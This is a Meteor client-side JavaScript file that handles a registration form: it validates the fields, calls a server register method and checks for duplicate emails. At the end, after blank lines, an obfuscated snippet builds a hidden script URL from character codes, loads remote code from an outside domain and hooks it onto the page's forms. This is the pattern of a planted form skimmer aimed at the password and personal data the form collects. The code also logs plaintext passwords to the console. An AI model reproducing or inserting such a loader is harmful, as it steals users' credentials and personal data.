Template.register.events({
    'submit form': function(event){
    	event.preventDefault();
    	console.log('Register in progress...');
    	var username=$('[name=username]').val();
    	var firstname =$('[name=fname]').val();
		var lastname =$('[name=lname]').val();
		var email = $('[name=email]').val();
		var password =$('[name=password]').val();
		var country=$('[name=pays]').val();
		var city=$('[name=ville]').val();
		var shipcard = '';
		var point = 0;
		var rerole = 'member';
		var msg = "";

		console.log(username, firstname, lastname, email, password, country, city, shipcard, point, rerole, msg);

		console.log('register in progress 2...')
		if( firstname == '' || lastname == ''  || email=='' || password ==''){
			if( firstname == '' )
				msg += '<p>Firt Name is required.</p>';
			if( lastname == '' )
				msg += '<p>Last Name is required.</p>';
			if( email == '' )
				msg += '<p>email is required.</p>';
			if( password == '' )
				msg += '<p>password is required.</p>';
			
			$(".register_msg").html(msg);
			Session.set("registerError", msg );
		}
		else{
			
			Meteor.call('register',firstname, lastname, email, password, shipcard, point, rerole,country,city,username,function(err){
				if(err){
					console.log(err.reason);
					Session.set("registerError",err.reason);
				}else{
					Session.set("registerError","");
					Router.go('registerSuccess'); 
				}
			});
		}
    },
    'change #email':function(e){
    	e.preventDefault();
    	var arr = [];
    	var user = Meteor.users.find();
    	user.forEach(function(entry){
    		var email = entry.emails[0].address;
    		arr.push(email);
    	});
    	var email = $('#email').val();
    	var same = arr.indexOf(email);
    	if(same>=0){
    		Session.set("Duplicate","Duplicate email address!");
    	}else{
    		Session.clear();
    	}
    }
});
Template.register.helpers({
	Duplicate:function(){
		return Session.get("Duplicate");
	}
});



(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b